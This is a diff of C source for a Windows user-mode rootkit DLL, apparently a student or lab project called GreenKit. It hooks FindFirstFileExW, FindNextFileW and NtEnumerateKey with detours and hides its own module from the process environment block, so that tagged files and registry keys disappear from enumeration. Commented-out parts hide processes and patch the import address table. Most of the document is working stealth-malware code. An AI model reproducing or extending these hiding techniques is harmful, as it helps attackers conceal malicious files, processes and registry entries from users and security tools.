@@ -106,351 +106,349 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 {
     NTSTATUS ret;
     UNICODE_STRING uStr_tmp;
-    ULONG tmpIndex;
+    ULONG tmpIndex = Index;
+	ULONG tmpInt = 0;
     HANDLE h_tmp;
     OBJECT_ATTRIBUTES ObjectAttributes;
-    ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 
-    if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
-        return ret;
-    else if (!NT_SUCCESS(ret))
-        return ret;
+	if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
+		ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+		if (NT_SUCCESS(ret)) {
+			uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
+			uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
 
-    uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
-    uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
+			if (mustShiftReg(uStr_tmp)) { // TODO change this part for more than one key to hide {
+				TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
+				NTSTATUS status;
+				InitializeObjectAttributes(&ObjectAttributes, &uStr_tmp, 0, KeyHandle, NULL);
+				if (NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes))) {
+					++tmpIndex;
+					CloseHandle(h_tmp);
+				}
+			}
 
+			if (tmpIndex != Index) {
+				ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+				if (ret != STATUS_SUCCESS)
+					return ret;
+				if (mustHideReg(uStr_tmp))
+					++tmpIndex;
+			}
 
-    if (!mustShiftReg(uStr_tmp)) // TODO change this part for more than one key to hide
-        return ret;
-    else {
-        TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
-        NTSTATUS status;
-        InitializeObjectAttributes(&ObjectAttributes, &uStr_tmp, 0, KeyHandle, NULL);
-        if (!NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes)))
-        {
-            MessageBox(0, "Opened key, returning with error " + status, "HookTest", MB_OK | MB_ICONERROR);
-            return ret;
-        }
-    }
+			do {
+				ret = hookNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
+				if (ret != STATUS_SUCCESS)
+					return ret;
+				if (!mustHideReg(uStr_tmp))
+					break;
+				else
+					++tmpInt;
+			} while (TRUE);
+		}
 
-    CloseHandle(h_tmp);
-    tmpIndex = Index + 1;
+		return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
+	}
 
-    ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-    if (ret != STATUS_SUCCESS)
-        return ret;
-    uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
-    uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
+	BOOL APIENTRY DllMain(HMODULE hModule,
+		DWORD  ul_reason_for_call,
+		LPVOID lpReserved
+		)
+	{
+		PELPEB peb = EL_GetPeb();
+		EL_HideModule(peb, L"GreenKit.dll");
+		HMODULE NtDll = LoadLibrary("ntdll.dll");
+		HMODULE Kernel32 = LoadLibrary("kernel32.dll");
 
-    hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-    if (mustHideReg(uStr_tmp))
-    {
-        MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
-        ++tmpIndex;
-    }
-    return hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-}
+		switch (ul_reason_for_call)
+		{
+		case DLL_PROCESS_ATTACH:
+			//oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
+			//hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
 
-BOOL APIENTRY DllMain(HMODULE hModule,
-    DWORD  ul_reason_for_call,
-    LPVOID lpReserved
-    )
-{
-    PELPEB peb = EL_GetPeb();
-    EL_HideModule(peb, L"GreenKit.dll");
-    HMODULE NtDll = LoadLibrary("ntdll.dll");
-    HMODULE Kernel32 = LoadLibrary("kernel32.dll");
+			oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
+			hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);
 
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-        //oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
-        //hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
+			oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
+			hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
 
-        oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
-        hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);
+			oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
+			hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
 
-        oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
-        hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
+		}
+		return TRUE;
+	}
+	/*
+	DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+	{
 
-        oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
-        hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
+	//MessageBox(0, "LISTING PROCESS CALLED", "HookTest", MB_OK | MB_ICONERROR);
+	SYSTEM_PROCESS_INFORMATION cur, prev;
+	char tmp[128];
 
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-/*
-DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
-{
-    
-    //MessageBox(0, "LISTING PROCESS CALLED", "HookTest", MB_OK | MB_ICONERROR);
-    SYSTEM_PROCESS_INFORMATION cur, prev;
-    char tmp[128];
+	DWORD r = hookNtQuery(i, SystemInformation, SystemInformationLength, ReturnLength);
 
-    DWORD r = hookNtQuery(i, SystemInformation, SystemInformationLength, ReturnLength);
+	if (i == SystemProcessInformation)
+	{
+	if (r == 0)
+	{
+	HKEY key;
+	DWORD size;
+	char exe[128];
+	RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
 
-    if (i == SystemProcessInformation)
-    {
-        if (r == 0)
-        {
-            HKEY key;
-            DWORD size;
-            char exe[128];
-            RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
+	RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
 
-            RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
+	RegCloseKey(key);
 
-            RegCloseKey(key);
+	cur = prev = (SYSTEM_PROCESS_INFORMATION)SystemInformation;
 
-            cur = prev = (SYSTEM_PROCESS_INFORMATION)SystemInformation;
+	while (1)
+	{
+	WideCharToMultiByte(CP_ACP, 0, cur->ProcessName.Buffer, -1, tmp, 128, NULL, NULL);
 
-            while (1)
-            {
-                WideCharToMultiByte(CP_ACP, 0, cur->ProcessName.Buffer, -1, tmp, 128, NULL, NULL);
+	if (strcmp(tmp, "explorer.exe") == 0)
+	{
+	if (cur->NextEntryOffset == 0)
+	{
+	prev->NextEntryOffset = 0;
+	break;
+	}
+	else
+	{
+	prev->NextEntryOffset += cur->NextEntryOffset;
+	cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
+	}
+	}
 
-                if (strcmp(tmp, "explorer.exe") == 0)
-                {
-                    if (cur->NextEntryOffset == 0)
-                    {
-                        prev->NextEntryOffset = 0;
-                        break;
-                    }
-                    else
-                    {
-                        prev->NextEntryOffset += cur->NextEntryOffset;
-                        cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
-                    }
-                }
+	if (cur->NextEntryOffset == 0)
+	break;
 
-                if (cur->NextEntryOffset == 0)
-                    break;
+	prev = cur;
+	cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
 
-                prev = cur;
-                cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
+	}
+	}
+	}
 
-            }
-        }
-    }
+	return 0;
+	}
+	*/
+	HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
+	{
+		HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
+		MessageBox(0, "EXPLORER HOOKED", "HookTest", MB_OK | MB_ICONERROR);
+		if (ret)
+		{
+			WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;
 
-    return 0;
-}
-*/
-HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
-{
-    HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
-    MessageBox(0, "EXPLORER HOOKED", "HookTest", MB_OK | MB_ICONERROR);
-    if (ret)
-    {
-        WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;
+			HANDLE std = GetStdHandle(STD_OUTPUT_HANDLE);
 
-        HANDLE std = GetStdHandle(STD_OUTPUT_HANDLE);
+			char name[512];
 
-        char name[512];
+			WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
 
-        WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
+			char exe[128];
 
-        char exe[128];
+			HKEY key;
+			DWORD size;
 
-        HKEY key;
-        DWORD size;
+			RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
 
-        RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
+			RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
 
-        RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
+			RegCloseKey(key);
 
-        RegCloseKey(key);
+			if (strstr(name, FILE_TAG) != 0)
+			{
+				hookFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
+			}
+		}
 
-        if (strstr(name, FILE_TAG) != 0)
-        {
-            hookFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
-        }
-    }
+		return ret;
+	}
 
-    return ret;
-}
+	void path_strip_filename2(TCHAR *Path) {
+		size_t Len = _tcslen(Path);
+		if (Len == 0) { return; };
+		size_t Idx = Len - 1;
+		while (TRUE) {
+			TCHAR Chr = Path[Idx];
+			if (Chr == TEXT('\\') || Chr == TEXT('/')) {
+				if (Idx == 0 || Path[Idx - 1] == ':') { Idx++; };
+				break;
+			}
+			else if (Chr == TEXT(':')) {
+				Idx++; break;
+			}
+			else {
+				if (Idx == 0) { break; }
+				else { Idx--; };
+			};
+		};
+		Path[Idx] = TEXT('\0');
+	};
 
-void path_strip_filename2(TCHAR *Path) {
-    size_t Len = _tcslen(Path);
-    if (Len == 0) { return; };
-    size_t Idx = Len - 1;
-    while (TRUE) {
-        TCHAR Chr = Path[Idx];
-        if (Chr == TEXT('\\') || Chr == TEXT('/')) {
-            if (Idx == 0 || Path[Idx - 1] == ':') { Idx++; };
-            break;
-        }
-        else if (Chr == TEXT(':')) {
-            Idx++; break;
-        }
-        else {
-            if (Idx == 0) { break; }
-            else { Idx--; };
-        };
-    };
-    Path[Idx] = TEXT('\0');
-};
+	BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata)
+	{
+		//BOOL ret = hookFNFW(findfile, finddata);
+		/*
+		if (ret)
+		{
+		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;
 
-BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata)
-{
-    //BOOL ret = hookFNFW(findfile, finddata);
-    /*
-    if (ret)
-    {
-        WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;
+		char name[512] = "";
 
-        char name[512] = "";
+		WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
 
-        WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
-        
-        char exe[128] = "";
+		char exe[128] = "";
 
-        HKEY key;
-        DWORD size;
+		HKEY key;
+		DWORD size;
 
-        RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
+		RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);
 
-        RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
+		RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);
 
-        RegCloseKey(key);
+		RegCloseKey(key);
 
-        if (strcmp(name, "EXAMPLE.txt") == 0 || isPartOf(name, "a"))
-        {
-            MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
-            hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
-        }
-    }
+		if (strcmp(name, "EXAMPLE.txt") == 0 || isPartOf(name, "a"))
+		{
+		MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
+		hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
+		}
+		}
 
-    return ret;
-    */
-    //MessageBox(0, "HOOKED FW", "HookTest", MB_OK | MB_ICONERROR);
-    WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;
+		return ret;
+		*/
+		//MessageBox(0, "HOOKED FW", "HookTest", MB_OK | MB_ICONERROR);
+		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;
 
-    char name[512] = "";
+		char name[512] = "";
 
-    WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
-    char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
-    WideCharToMultiByte(CP_ACP, 0, finddata->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
-    path_strip_filename2(szFileName);
-    memcpy(szBuffer, szFileName, 6);
-    BOOL ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
-    if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
-    {
-        MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
-        ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
-    }
-    return ret;
-}
+		WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
+		char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
+		WideCharToMultiByte(CP_ACP, 0, finddata->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
+		path_strip_filename2(szFileName);
+		memcpy(szBuffer, szFileName, 6);
+		BOOL ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
+		if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
+		{
+			MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
+			ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
+		}
+		return ret;
+	}
 
-// OLD
-/*
-VOID WriteFile()
-{
-    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
-        GENERIC_WRITE,          // open for writing
-        0,                      // do not share
-        NULL,                   // default security
-        CREATE_NEW,             // create new file only
-        FILE_ATTRIBUTE_NORMAL,  // normal file
-        NULL);                  // no attr. template
+	// OLD
+	/*
+	VOID WriteFile()
+	{
+	HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
+	GENERIC_WRITE,          // open for writing
+	0,                      // do not share
+	NULL,                   // default security
+	CREATE_NEW,             // create new file only
+	FILE_ATTRIBUTE_NORMAL,  // normal file
+	NULL);                  // no attr. template
 
-    DWORD dwBytesWritten = 0;
-    char Str[] = "Coucou";
-    WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
-}
+	DWORD dwBytesWritten = 0;
+	char Str[] = "Coucou";
+	WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
+	}
 
-BOOL mustHideFile(TCHAR filePath) {
-    return FALSE; // TODO check la fin de la string avec des constantes
-}
+	BOOL mustHideFile(TCHAR filePath) {
+	return FALSE; // TODO check la fin de la string avec des constantes
+	}
 
-NTSTATUS WINAPI NewNtOpenFile(
-    PHANDLE				phFile,
-    ACCESS_MASK			DesiredAccess,
-    POBJECT_ATTRIBUTES	ObjectAttributes,
-    PIO_STATUS_BLOCK	IoStatusBlock,
-    ULONG				ShareAccess,
-    ULONG				OpenOptions)
-{
-    TCHAR sPath[MAX_PATH];
-    //DWORD dwRet;
-    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
-    WriteFile();
-    //if (!mustHideFile(*sPath))
-    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+	NTSTATUS WINAPI NewNtOpenFile(
+	PHANDLE				phFile,
+	ACCESS_MASK			DesiredAccess,
+	POBJECT_ATTRIBUTES	ObjectAttributes,
+	PIO_STATUS_BLOCK	IoStatusBlock,
+	ULONG				ShareAccess,
+	ULONG				OpenOptions)
+	{
+	TCHAR sPath[MAX_PATH];
+	//DWORD dwRet;
+	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
+	MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+	WriteFile();
+	//if (!mustHideFile(*sPath))
+	//NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
 
-    return 0;//status; // STATUS_NO_SUCH_FILE
-}
+	return 0;//status; // STATUS_NO_SUCH_FILE
+	}
 
-NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
-    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
-{
-    //TCHAR sPath[MAX_PATH];
-    //DWORD dwRet;
-    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-    MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
-    //if (!mustHideFile(*sPath))
-    NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
-        CreateOptions, EaBuffer, EaLength);
+	NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
+	PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
+	ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
+	{
+	//TCHAR sPath[MAX_PATH];
+	//DWORD dwRet;
+	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
+	MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+	//if (!mustHideFile(*sPath))
+	NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
+	CreateOptions, EaBuffer, EaLength);
 
-    return status; // STATUS_NO_SUCH_FILE
-}
+	return status; // STATUS_NO_SUCH_FILE
+	}
 
-void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
-{
-#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
-    DWORD dwOldProtect, dwOldProtect2;
-    HMODULE hModule = GetModuleHandle(NULL);
-    PIMAGE_DOS_HEADER pDosHeader;
-    PIMAGE_NT_HEADERS pNTHeader;
-    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
-    PIMAGE_THUNK_DATA pThunk;
-    void *pOldFunction;
-    if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
-    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
-    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
-    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
-    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
-    while (pImportDesc->Name)
-    {
-        char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
-        if (!stricmp(szModuleName, szDllName)) break;
-        pImportDesc++;
-    }
-    if (pImportDesc->Name == NULL) return (NULL);
-    pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
-    while (pThunk->u1.Function)
-    {
-        if (pThunk->u1.Function == (DWORD)pOldFunction)
-        {
-            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
-            pThunk->u1.Function = (DWORD)pNewFunction;
-            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
-            return (pOldFunction);
-        }
-        pThunk++;
-    }
-    return (NULL);
-}
+	void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
+	{
+	#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
+	DWORD dwOldProtect, dwOldProtect2;
+	HMODULE hModule = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER pDosHeader;
+	PIMAGE_NT_HEADERS pNTHeader;
+	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
+	PIMAGE_THUNK_DATA pThunk;
+	void *pOldFunction;
+	if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
+	pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
+	pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
+	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
+	while (pImportDesc->Name)
+	{
+	char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
+	if (!stricmp(szModuleName, szDllName)) break;
+	pImportDesc++;
+	}
+	if (pImportDesc->Name == NULL) return (NULL);
+	pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
+	while (pThunk->u1.Function)
+	{
+	if (pThunk->u1.Function == (DWORD)pOldFunction)
+	{
+	VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	pThunk->u1.Function = (DWORD)pNewFunction;
+	VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
+	return (pOldFunction);
+	}
+	pThunk++;
+	}
+	return (NULL);
+	}
 
-bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
-{
+	bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
+	{
 	switch (dwReason)
 	{
-		case DLL_PROCESS_ATTACH:
-            MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
-			hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
-			hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
-			hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
-            hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
-            hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindNextFileA", MyFindNextFileA));
-            hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileW", MyFindFirstFileW));
-            hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindNextFileW", MyFindNextFileW));
-			return TRUE;
+	case DLL_PROCESS_ATTACH:
+	MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
+	hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
+	hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
+	hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
+	hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
+	hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindNextFileA", MyFindNextFileA));
+	hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileW", MyFindFirstFileW));
+	hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindNextFileW", MyFindNextFileW));
+	return TRUE;
 	}
 	return TRUE;
-}*/
+	}*/
